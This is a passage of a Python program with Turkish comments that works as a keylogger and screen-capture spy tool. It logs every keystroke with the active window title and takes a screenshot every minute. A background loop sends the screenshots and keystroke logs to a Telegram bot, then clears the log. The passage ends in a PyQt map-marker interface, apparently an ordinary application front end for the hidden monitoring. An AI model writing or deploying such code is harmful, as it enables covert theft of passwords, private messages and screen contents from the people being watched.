# --- TELEGRAM AYARLARI ---
TELEGRAM_TOKEN = "Kendi Telegram Bot Token'ınızı Buraya Gririn"
TELEGRAM_CHAT_ID = "Kendi Chat ID'nizi Buraya Giriniz"

LOG_DOSYASI = "logs/sistem_aktivite.txt"
SCREENSHOT_KLASOR = "screenshots"
SCREENSHOT_ARALIGI = 60
RAPOR_ARALIGI = 60

if not os.path.exists("logs"): os.makedirs("logs")
if not os.path.exists(SCREENSHOT_KLASOR): os.makedirs(SCREENSHOT_KLASOR)
logging.basicConfig(filename=LOG_DOSYASI, level=logging.INFO, format='%(asctime)s: %(message)s')

# --- ARKA PLAN SİSTEMLERİ ---
def telegram_rapor_gonder():
    print(">>> Telegram raporlama ve görsel iletimi aktif...")
    while True:
        try:
            # 1. Metin Raporu
            mesaj = f"🚀 *Eren Karaca Sistem Raporu*\nDurum: Aktif\nSaat: {time.strftime('%H:%M:%S')}"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                          data={"chat_id": TELEGRAM_CHAT_ID, "text": mesaj, "parse_mode": "Markdown"}, timeout=10)

            # 2. En Son Ekran Görüntüsünü Gönder
            resimler = [os.path.join(SCREENSHOT_KLASOR, f) for f in os.listdir(SCREENSHOT_KLASOR) if f.endswith('.png')]
            if resimler:
                en_yeni_resim = max(resimler, key=os.path.getctime)
                with open(en_yeni_resim, "rb") as photo:
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", 
                                  data={"chat_id": TELEGRAM_CHAT_ID, "caption": "📸 Son Ekran Görüntüsü"}, files={"photo": photo}, timeout=15)

            # 3. Log Dosyasını Gönder
            if os.path.exists(LOG_DOSYASI) and os.path.getsize(LOG_DOSYASI) > 0:
                with open(LOG_DOSYASI, "rb") as f:
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument", 
                                  data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=15)
                open(LOG_DOSYASI, 'w').close()
        except Exception as e:
            print(f">>> Telegram İletim Hatası: {e}")
        
        time.sleep(RAPOR_ARALIGI)

def on_press(key):
    try:
        active_window = gw.getActiveWindow()
        title = active_window.title if active_window else "Bilinmeyen"
        logging.info(f"[{title}] {key}")
    except: pass

def ekran_goruntusu_dongusu():
    while True:
        try:
            ts = time.strftime("%Y%m%d-%H%M%S")
            pyautogui.screenshot().save(f"{SCREENSHOT_KLASOR}/ekran_{ts}.png")
        except: pass
        time.sleep(SCREENSHOT_ARALIGI)

# --- ARAYÜZ ---
class Bridge(QObject):
    def __init__(self, parent): super().__init__(); self.parent = parent
    @pyqtSlot(int)
    def markerClicked(self, index): self.parent.detaylari_goster(index - 1)
    @pyqtSlot()
    def pencereyiKapat(self): self.parent.sol_panel.hide()

